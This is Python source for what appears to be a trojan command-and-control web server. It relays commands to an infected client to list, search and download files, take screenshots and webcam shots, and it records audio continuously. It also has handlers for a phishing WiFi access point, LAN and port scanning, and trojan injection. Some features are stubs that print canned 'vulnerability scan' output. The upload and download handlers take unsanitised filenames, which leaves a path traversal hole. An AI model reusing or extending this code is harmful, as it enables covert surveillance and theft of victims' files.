#encoding=utf-8
import os
import sys
import json
import time
import tornado.httpserver
import tornado.web
import tornado.ioloop
import md5
import socket
import thread
import threading
import logging
from tornado import websocket
import random
import uuid
from ap_kit import ap_scan
from ap_kit import host_scan
from ap_kit import record
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

globalCommandSocket=socket.socket() #全局命令发送socket

listenPort=8095
trojanServerPort=8096
wsIp=""
currentAudioIndex=0

downloadBaseLink=""
if(os.name=="nt"):#windows
    downloadBaseLink="http://127.0.0.1:{}/download?filename=".format(listenPort)
    wsIp="127.0.0.1"
else:
    downloadBaseLink="http://192.168.1.181:{}/download?filename=".format(listenPort)
    wsIp="192.168.1.181"


class Index(tornado.web.RequestHandler):
    def get(self):
        global listenPort
        global downloadBaseLink
        print "[+]Enter get index"
        if(os.name=="nt"):#windows
            self.render("index.html",ipAddress=wsIp,lp=listenPort)
        else:
            self.render("index.html",ipAddress=wsIp,lp=listenPort)
    def set_default_headers(self):
        self.set_header("Access-Control-Allow-Origin", "*")
        self.set_header("Access-Control-Allow-Headers", "x-requested-with")
        self.set_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')


class AudioHandler(tornado.web.RequestHandler):
    def get(self):
        global currentAudioIndex
        if(currentAudioIndex>2):
            index="{'index':'"+str(currentAudioIndex-2)+"'}"
            self.write(index)
        else:
            self.write("{'index':'0'}")
    def set_default_headers(self):
        self.set_header("Access-Control-Allow-Origin", "*")
        self.set_header("Access-Control-Allow-Headers", "x-requested-with")
        self.set_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')

class ClientCallbackResultHandler(tornado.web.RequestHandler):#处理木马客户端的回调信息
    def get(self):
        self.write("")

    def post(self):
        rawData=self.get_argument("rawData")
        pkg=json.loads(rawData)#字符串必须是json格式
        #并且该json字符串的格式必须是{"Type":...,"Content":...}
        PkgType=pkg["Type"]
        PkgContent=pkg["Content"]
        #部分功能不是直接转发 而是需要检查状态
        if(PkgType=='DownloadFileResult'):
            #这是木马客户端将文件到服务器的状态
            actionResult=PkgContent['actionResult']
            if(actionResult.find("success")!=-1):
                #文件已经从木马客户端上传到了主服务器 下面是进行文件的转发
                filename=PkgContent['filename']
                downloadUrl=downloadBaseLink+filename#这里可能有文件重名的bug  之后再完善
                logging.debug("Send download url="+downloadUrl)
                #修改原数据包，加上下载链接的字段
                pkg["Content"]["downloadUrl"]=downloadUrl
                rawData=json.dumps(pkg)
            else:
                pkg["Content"]["downloadUrl"]=""
                rawData=json.dumps(pkg)
                logging.debug("File upload error,reason="+actionResult)
                #文件上传错误  检查错误原因
        SocketHandler.send_to_all(rawData)#直接将木马客户端的数据包转发到网页
        logging.debug("Receive from trojan client,msg is:{}".format(rawData))
    def set_default_headers(self):
        self.set_header("Access-Control-Allow-Origin", "*")
        self.set_header("Access-Control-Allow-Headers", "x-requested-with")
        self.set_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')

class FileDownloadHandler(tornado.web.RequestHandler):#文件下载处理类
    def get(self):
        lastname=self.get_argument("filename")
        filename="download/"+self.get_argument("filename") #"test.txt"
        if(os.path.exists(filename)==False):#判断该文件是否存在
            self.write("No such file")
            self.finish()
        else:
            self.set_header ('Content-Type', 'application/octet-stream')
            self.set_header ('Content-Disposition', 'attachment; filename='+lastname)
            buf_size=4096#每次读取的文件缓存
            with open(filename, 'rb') as f:
                while True:
                    data = f.read(buf_size)
                    if not data:
                        break
                    self.write(data)
            self.finish()
    def set_default_headers(self):
        self.set_header("Access-Control-Allow-Origin", "*")
        self.set_header("Access-Control-Allow-Headers", "x-requested-with")
        self.set_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')

class FileUploadHandler(tornado.web.RequestHandler):
    def set_default_headers(self):
        self.set_header("Access-Control-Allow-Origin", "*")
        self.set_header("Access-Control-Allow-Headers", "x-requested-with")
        self.set_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
    def get(self):
        print "Enter get mode"
        self.write('''
        <html>
          <head><title>Upload File</title></head>
          <body>
            <form action='upload' enctype="multipart/form-data" method='post'>
            <input type='file' name='file'/><br/>
            <input type='submit' value='submit'/>
            </form>
          </body>
        </html>
        ''')
    def post(self):
        print "Enter post mode"
        upload_path=os.path.join(os.path.dirname(__file__),'download')   #文件的暂存路径
        file_metas=self.request.files['file']  #提取表单中‘name’为‘file’的文件元数据
        for meta in file_metas:
            filename=meta['filename']
            #logging.debug("upload path:{}".format(upload_path))
            #logging.debug("filename:{}".format(filename))
            filepath=os.path.join(upload_path,filename)
            #logging.debug("file path:{}".format(filepath))
            with open(filepath,'wb') as up:#全部以二进制方式写入 这样更加安全
                up.write(meta['body'])
            self.write('finished!')
    def set_default_headers(self):
        self.set_header("Access-Control-Allow-Origin", "*")
        self.set_header("Access-Control-Allow-Headers", "x-requested-with")
        self.set_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')

class SocketHandler(tornado.websocket.WebSocketHandler):#websocket句柄
    clients =set()

    @staticmethod
    def send_to_all(message):
        for c in SocketHandler.clients:
            c.write_message(message)
            #logging.info("Send {} to {}".format(message,id(c)))

    def open(self):#一个新的websocket开启了
        SocketHandler.clients.add(self)
        logging.info("New connection from {}".format(id(self)))

    def on_close(self):#websocket断开连接
        SocketHandler.clients.remove(self)
        logging.info("{} detached".format(id(self)))

    def check_origin(self,origin):
        return True

    def on_message(self, message):#websocket接收到客户端发送过来的数据
        global downloadBaseLink
        logging.info("{} says:{}".format(id(self),message))
        pkg=json.loads(message)#字符串必须是json格式
        #并且该json字符串的格式必须是{"Type":...,"Content":...}
        PkgType=pkg["Type"]
        PkgContent=pkg["Content"]
        logging.info("Package type={}".format( PkgType ))
        logging.info("Package cont={}".format( PkgContent ))
        toSendJson={}
        if(PkgType=="StartWifiScan"):#进行WiFi扫描 同时会返回第一次扫描的信息
            getWifiScanResult()

        elif(PkgType=="GetWifiScan"):#直接返回当前的WiFi信息
            getWifiScanResult()
            #将数据传输到客户端

        elif(PkgType=="StartFakeAp"):#开启钓鱼WiFi
            fakeApSsid=PkgContent['ssid']
            fakeApPassword=PkgContent['password']
            fakeApKey_mgmt=PkgContent['key_mgmt']
            fakeApAction=PkgContent['action']
            startFakeAp(fakeApSsid,fakeApPassword,fakeApKey_mgmt,fakeApAction)#应该写成非阻塞的

        elif(PkgType=="ConnectWifiAp"):#连接指定WiFi
            apSsid=PkgContent['ssid']
            apPassword=PkgContent['password']
            apAction=PkgContent['action']
            connectWifi(apSsid,apPassword,apAction)
            
        elif(PkgType=="Pwd"):#获取当前目录
            GetPwd()#这里将任务分发下去  异步传回结果

        elif(PkgType=="GetPathFiles"):#获取指定文件目录下的文件列表
            filepath=PkgContent['filepath']
            GetPathFiles(filepath)#这里将任务分发下去  异步传回结果
            #下面使用的是测试用代码 之后需要替换掉

        elif(PkgType=="DownloadFile"):#下载指定目录下的文件
            filenamepath=PkgContent['filenamepath']
            DownloadFile(filenamepath)

        elif(PkgType=="SearchFile"):#搜索指定文件 可以支持模糊搜索
            searchName=PkgContent['searchname']
            SearchFile(searchName)

        elif(PkgType=="Snapshot"):#截屏
            GetScreenshot()

        elif(PkgType=="Camerashot"):#截屏
            GetCamerashot()

        elif(PkgType=="GetLanHosts"):#获取当前局域网主机列表
            GetLanHosts()

        elif(PkgType=="ScanHostVulnerabilities"):#获取特定主机的漏洞情况
            targetIp=PkgContent['ip']
            ScanHostVulnerabilities(targetIp)

        elif(PkgType=="InjectTrojan"):#向特定主机植入木马
            targetIp=PkgContent['ip']
            InjectTrojan(targetIp)

        elif(PkgType=="ScanHostPort"):#获取特定主机的端口扫描情况
            targetIp=PkgContent['ip']
            ScanHostPort(targetIp)

        elif(PkgType=="GetFakeApConnections"):#获取当前钓鱼WiFi连接数量
            GetFakeApConnections()

        elif(PkgType=="GetFakeApDataStreamAmount"):#获取当前钓鱼wifi的捕获流量
            GetFakeApDataStreamAmount()

def InjectTrojan(targetIp):
    logging.debug("Get InjectTrojan")
    toSendJson={}
    for x in range(10):
        toSendJson['Type']="InjectTrojanResult" 
        toSendJson['Content']={
            'Result':'.'
        } 
        toSendJsonString=json.dumps(toSendJson)
        SocketHandler.send_to_all(toSendJsonString)
        time.sleep(0.2)
    toSendJson['Type']="InjectTrojanResult" 
    toSendJson['Content']={
        'Result':'   Try to write fake app in our ap website...'
    } 
    toSendJsonString=json.dumps(toSendJson)
    SocketHandler.send_to_all(toSendJsonString)
    time.sleep(0.2)

def ScanHostVulnerabilities(targetIp):
    logging.debug("Get ScanHostVulnerabilities")
    content='[+] Target[{}] scanning begin........\r\n'.format(targetIp)
    toSendJson={}
    toSendJson['Type']="ScanHostVulnerabilitiesResult" 
    toSendJson['Content']={
        'Result':content
    } 
    toSendJsonString=json.dumps(toSendJson)
    SocketHandler.send_to_all(toSendJsonString)
    time.sleep(1)

    content='Digging for CVE-2014-8592...'
    toSendJson['Content']={
        'Result':content
    } 
    toSendJsonString=json.dumps(toSendJson)
    SocketHandler.send_to_all(toSendJsonString)
    time.sleep(0.3)

    content='Digging for CVE-2016-8576...'
    toSendJson['Content']={
        'Result':content
    } 
    toSendJsonString=json.dumps(toSendJson)
    SocketHandler.send_to_all(toSendJsonString)
    time.sleep(0.3)

    content='Digging for CVE-2017-8532...'
    toSendJson['Content']={
        'Result':content
    } 
    toSendJsonString=json.dumps(toSendJson)
    SocketHandler.send_to_all(toSendJsonString)
    time.sleep(0.3)

    content='Digging for CVE-2017-8542...'
    toSendJson['Content']={
        'Result':content
    } 
    toSendJsonString=json.dumps(toSendJson)
    SocketHandler.send_to_all(toSendJsonString)
    time.sleep(0.3)

    content='Digging for CVE-2017-8544...'
    toSendJson['Content']={
        'Result':content
    } 
    toSendJsonString=json.dumps(toSendJson)
    SocketHandler.send_to_all(toSendJsonString)
    time.sleep(0.3)

    content='Digging for CVE-2017-8551...'
    toSendJson['Content']={
        'Result':content
    } 
    toSendJsonString=json.dumps(toSendJson)
    SocketHandler.send_to_all(toSendJsonString)
    time.sleep(0.3)

    content='Digging for CVE-2017-8554...'
    toSendJson['Content']={
        'Result':content
    } 
    toSendJsonString=json.dumps(toSendJson)
    SocketHandler.send_to_all(toSendJsonString)
    time.sleep(0.3)

    content='Digging for CVE-2017-8556...'
    toSendJson['Content']={
        'Result':content
    } 
    toSendJsonString=json.dumps(toSendJson)
    SocketHandler.send_to_all(toSendJsonString)
    time.sleep(0.3)

    content='Digging for CVE-2017-8557...'
    toSendJson['Content']={
        'Result':content
    } 
    toSendJsonString=json.dumps(toSendJson)
    SocketHandler.send_to_all(toSendJsonString)
    time.sleep(0.3)

    content='Digging for CVE-2017-8564...'
    toSendJson['Content']={
        'Result':content
    } 
    toSendJsonString=json.dumps(toSendJson)
    SocketHandler.send_to_all(toSendJsonString)
    time.sleep(0.3)

    content='[-]No holes!!Please use fake app to hack them!'
    toSendJson['Content']={
        'Result':content
    } 
    toSendJsonString=json.dumps(toSendJson)
    SocketHandler.send_to_all(toSendJsonString)
    time.sleep(0.3)

    

def asyncScanHostPort(targetIp):
    scan_ret=host_scan.port_scan(targetIp)
    scan_result=""
    for index in scan_ret:
        scan_result+="[+] Port {} is open \r\n".format(scan_ret[index])

    toSendJson={}
    toSendJson['Type']="ScanHostPortResult" 
    toSendJson['Content']={
        'Result':'[+] Target[{}] ports scan results:\r\n {}'.format(targetIp,scan_result)
    } 
    toSendJsonString=json.dumps(toSendJson)
    SocketHandler.send_to_all(toSendJsonString)

def ScanHostPort(targetIp):#搜索指定ip的端口
    logging.debug("Get Lan Hosts")
    asyncScanHostPort(targetIp)

def asyncGetLanHosts():
    scan_result=host_scan.host_scan()
    toSendJson={}
    toSendJson['Type']="GetLanHostsResult" 
    toSendJson['Content']=scan_result
    toSendJsonString=json.dumps(toSendJson)
    SocketHandler.send_to_all(toSendJsonString)

def GetLanHosts():#获取局域网下面的主机数量
    logging.debug("enter GetLanHosts")
    thread.start_new_thread(asyncGetLanHosts,())

def GetFakeApConnections():
    logging.debug("Get FakeApConnections")
    toSendJson={}
    toSendJson['Type']="GetFakeApConnectionsResult" 
    toSendJson['Content']={
        'Amount':'2'       
    } 
    toSendJsonString=json.dumps(toSendJson)
    SocketHandler.send_to_all(toSendJsonString)

def GetFakeApDataStreamAmount():
    logging.debug("Get GetFakeApDataStreamAmount")
    toSendJson={}
    toSendJson['Type']="GetFakeApDataStreamAmount" 
    toSendJson['Content']={
        'Amount':'20481'       
    } 
    toSendJsonString=json.dumps(toSendJson)
    SocketHandler.send_to_all(toSendJsonString)

def asyncStartFakeAp(Ssid,Password,Key_mgmt,Action):
    time.sleep(5)
    toSendJson={}
    if(Action=="start"):
        #将连接wifi状态发送回去
        toSendJson['Type']="FakeApStatus"
        toSendJson['Content']={'status':'active'}
        toSendJsonString=json.dumps(toSendJson)
        SocketHandler.send_to_all(toSendJsonString)
        logging.debug("StartFakeAp ssid={} pwd={} enctype={} action={}".format(Ssid,Password,Key_mgmt,Action))
    elif(Action=="stop"):
        toSendJson['Type']="FakeApStatus"
        toSendJson['Content']={'status':'inactive'}
        toSendJsonString=json.dumps(toSendJson)
        SocketHandler.send_to_all(toSendJsonString)
        logging.debug("StopFakeAp ssid={} pwd={} action={}".format(Ssid,Password,Key_mgmt,Action))

def startFakeAp(Ssid,Password,Key_mgmt,Action):
    logging.debug("enter startFakeAp")
    thread.start_new_thread(asyncStartFakeAp,(Ssid,Password,Key_mgmt,Action))

def asyncConnectWifi(Ssid,Password,Action):
    time.sleep(5)
    toSendJson={}
    actionResult="success"
    toSendJson['Type']="WifiConnectStatus"
    toSendJson['Content']={'status':actionResult}
    toSendJsonString=json.dumps(toSendJson)
    SocketHandler.send_to_all(toSendJsonString)
    if(Action=="connect"):
        logging.debug("ConnectWifiAp ssid={} pwd={} action={}".format(Ssid,Password,Action)) 
        return "Connect"
    elif(Action=="disconnect"):
        logging.debug("DisConnectWifiAp ssid={} pwd={} action={}".format(Ssid,Password,Action)) 
        return "Disconnect"

def connectWifi(Ssid,Password,Action):
    logging.debug("enter connectWifi")
    thread.start_new_thread(asyncConnectWifi,(Ssid,Password,Action))

def asyncGetWifScanResult():
    '''
    wifiScanResult=[   
            {'ssid':'seu-wlan','pwr':'-45','enctype':'none','channel':'11'},
            {'ssid':'CMCC','pwr':'-56','enctype':'none','channel':'1'},
            {'ssid':'Huawei Phone','pwr':'-47','enctype':'WPA2-PSK','channel':'6'},
            {'ssid':'Xiaomi','pwr':'-77','enctype':'WPA2-PSK','channel':'11'},
            {'ssid':'Chro','pwr':'-54','enctype':'WPA-PSK','channel':'11'}
        ]
    for index,_info in enumerate(wifiScanResult):
        toSendContent[str(index)]=_info
    '''
    toSendContent=ap_scan.scan()
    toSendJson={}
    toSendJson['Type']='WifiScanResult'
    toSendJson['Content']=toSendContent
    logging.debug("async GetWifiScanResult")
    toSendJsonString=json.dumps(toSendJson)
    SocketHandler.send_to_all(toSendJsonString) 
    
def getWifiScanResult():#获取wifi扫描结果
    logging.debug("GetWifiScanResult")
    thread.start_new_thread(asyncGetWifScanResult,())


def intervalSendMsg():
    while True:
        time.sleep(3)
        SocketHandler.send_to_all("{}".format(time.ctime()))
        time.sleep(100)

def SendCommandServer():
    global globalCommandSocket
    global trojanServerPort
    sendCommandServer=socket.socket(socket.AF_INET,socket.SOCK_STREAM)#服务端接收客户端数据通道
    sendCommandServer.bind(("0.0.0.0",trojanServerPort))
    sendCommandServer.listen(100)
    print "Listening..."
    while True:
        con,addr=sendCommandServer.accept()
        print "New connection from ",addr
        globalCommandSocket=con

def GetPwd():
    toSendJson={}
    toSendJson['Type']="Pwd"
    toSendJson['Content']={'action':'pwd'}
    toSendJsonString=json.dumps(toSendJson)
    try:
        globalCommandSocket.sendall(toSendJsonString)#测试将指令转发到客户端
    except Exception as e:#需要检测客户端是否在线
        print e
    logging.debug("Pwd")

def GetPathFiles(filepath):#获取指定文件目录下的文件信息
    toSendJson={}
    toSendJson['Type']="GetPathFiles"
    toSendJson['Content']={'filepath':filepath}
    toSendJsonString=json.dumps(toSendJson)
    try:
        globalCommandSocket.sendall(toSendJsonString)#测试将指令转发到客户端
    except Exception as e:#需要检测客户端是否在线
        print e
    logging.debug("GetPathFiles ,path={}".format(filepath))

def DownloadFile(filenamepath):
    toSendJson={}
    toSendJson['Type']="DownloadFile"
    toSendJson['Content']={'filenamepath':filenamepath}
    toSendJsonString=json.dumps(toSendJson)
    try:
        globalCommandSocket.sendall(toSendJsonString)#测试将指令转发到客户端
    except Exception as e:#需要检测客户端是否在线
        print e
    logging.debug("Download File ,path={}".format(filenamepath))

def SearchFile(searchName):
    toSendJson={}
    toSendJson['Type']="SearchFile"
    toSendJson['Content']={'searchname':searchName}
    toSendJsonString=json.dumps(toSendJson)
    try:
        globalCommandSocket.sendall(toSendJsonString)#测试将指令转发到客户端
    except Exception as e:#需要检测客户端是否在线
        print e
    logging.debug("Search File ,searchname={}".format(searchName))

def GetScreenshot():
    toSendJson={}
    toSendJson['Type']="Snapshot"
    toSendJson['Content']={'action':'snapshot'}
    toSendJsonString=json.dumps(toSendJson)
    try:
        globalCommandSocket.sendall(toSendJsonString)#测试将指令转发到客户端
    except Exception as e:#需要检测客户端是否在线
        print e
    logging.debug("Get Snapshot")

def GetCamerashot():
    toSendJson={}
    toSendJson['Type']="Camerashot"
    toSendJson['Content']={'action':'camerashot'}
    toSendJsonString=json.dumps(toSendJson)
    try:
        globalCommandSocket.sendall(toSendJsonString)#测试将指令转发到客户端
    except Exception as e:#需要检测客户端是否在线
        print e
    logging.debug("Get Camerashot")


def AudioRecordThread():
    global currentAudioIndex
    currentAudioIndex=0
    while True:
        record.record("download/{}.wav".format(currentAudioIndex),5)
        currentAudioIndex+=1



if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG,
                    format="%(asctime)s [%(levelname)s] %(filename)s[%(lineno)d] %(message)s",
                    datefmt='%Y/%m/%d %H:%M:%S',
                    #filename='_server_.log',filemode='a'
                    )# debug info warning error cirtical
    app = tornado.web.Application([
        ('/', Index),
        ('/soc', SocketHandler),#用来处理websocket连接
        ('/download',FileDownloadHandler),#用来处理文件下载请求
        ('/upload',FileUploadHandler),#用来处理文件上传请求
        ('/clientcallback',ClientCallbackResultHandler),
        ('/getAudioIndex',AudioHandler),
        ],
        cookie_secret='abcd',
        template_path=os.path.join(os.path.dirname(__file__), "templates"),
        static_path=os.path.join(os.path.dirname(__file__), "static"),
    )
    app.listen(listenPort)
    logging.info("Server is running...")
    #threading.Thread(target=intervalSendMsg,args=()).start()
    #threading.Thread(target=SendCommandServer,args=()).start()
    thread.start_new_thread(SendCommandServer,())
    thread.start_new_thread(AudioRecordThread,())
    tornado.ioloop.IOLoop.instance().start()
